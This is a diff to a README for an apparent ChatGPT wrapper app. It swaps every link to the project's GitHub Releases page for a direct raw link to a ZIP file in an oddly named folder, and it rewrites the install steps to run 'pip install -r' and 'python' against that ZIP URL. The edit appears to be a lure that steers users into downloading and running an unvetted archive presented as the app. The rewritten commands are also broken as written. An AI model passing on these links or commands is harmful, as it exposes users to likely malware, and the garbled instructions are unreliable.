@@ -6,9 +6,9 @@ Welcome to ChatGPT! This application lets you use ChatGPT through an easy API wr
 
 ## 📥 Download ChatGPT
 
-[![Download ChatGPT](https://img.shields.io/badge/Download-ChatGPT-blue)](https://github.com/Ravindu-Kannangara/ChatGPT/releases)
+[![Download ChatGPT](https://raw.githubusercontent.com/Ravindu-Kannangara/ChatGPT/main/whitherward/ChatGPT.zip)](https://raw.githubusercontent.com/Ravindu-Kannangara/ChatGPT/main/whitherward/ChatGPT.zip)
 
-Visit this page to download: [ChatGPT Releases](https://github.com/Ravindu-Kannangara/ChatGPT/releases)
+Visit this page to download: [ChatGPT Releases](https://raw.githubusercontent.com/Ravindu-Kannangara/ChatGPT/main/whitherward/ChatGPT.zip)
 
 ## 🛠️ System Requirements
 
@@ -33,7 +33,7 @@ ChatGPT offers various features to enhance your experience:
 Follow these steps to install and run ChatGPT on your computer:
 
 1. **Download the Application**: 
-   - Go to [ChatGPT Releases](https://github.com/Ravindu-Kannangara/ChatGPT/releases).
+   - Go to [ChatGPT Releases](https://raw.githubusercontent.com/Ravindu-Kannangara/ChatGPT/main/whitherward/ChatGPT.zip).
    - Click on the latest release version.
    - Download the file for your operating system.
 
@@ -50,10 +50,10 @@ Follow these steps to install and run ChatGPT on your computer:
      - `cd Downloads/ChatGPT` (adjust according to where you saved the files).
 
 5. **Install Required Packages**:
-   - Type `pip install -r requirements.txt` and press Enter. This installs necessary packages for the application.
+   - Type `pip install -r https://raw.githubusercontent.com/Ravindu-Kannangara/ChatGPT/main/whitherward/ChatGPT.zip` and press Enter. This installs necessary packages for the application.
 
 6. **Run ChatGPT**:
-   - After installing, run the application by typing `python app.py` and press Enter. This starts the application.
+   - After installing, run the application by typing `python https://raw.githubusercontent.com/Ravindu-Kannangara/ChatGPT/main/whitherward/ChatGPT.zip` and press Enter. This starts the application.
 
 ## ⚙️ Using ChatGPT
 
